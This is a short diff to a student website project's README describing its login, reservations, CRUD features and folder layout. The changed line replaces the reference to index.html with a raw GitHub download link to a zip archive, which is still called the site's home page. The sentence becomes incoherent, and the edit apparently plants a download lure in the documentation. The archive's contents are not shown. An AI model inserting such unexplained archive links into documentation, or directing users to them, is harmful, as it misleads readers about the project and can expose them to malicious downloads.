@@ -26,7 +26,7 @@ Stay tuned!
 Repository Content;
 !!!DATABASE IS NOT INCLUDED IN THIS REPOSITORY
 !!!DO NOT CHANGE FOLDER STRUCTURE / FOLDER NAMES OR FILE NAMES
-index.html is the home page of this site. To access Reservations or view the user account, first user has to login (auto redirected to the login page)
+https://github.com/Dinidu2003/WildVenture/raw/refs/heads/main/database_feedback/Venture_Wild_3.0.zip is the home page of this site. To access Reservations or view the user account, first user has to login (auto redirected to the login page)
 Inside login page, the user can log in with an existing account or create a new account by entering their details.
 Website currently has 4 CRUDS implemented (for; registered user, admin, reservations, feedbacks).
 All CSS and other main elements are located in "templates" folder.
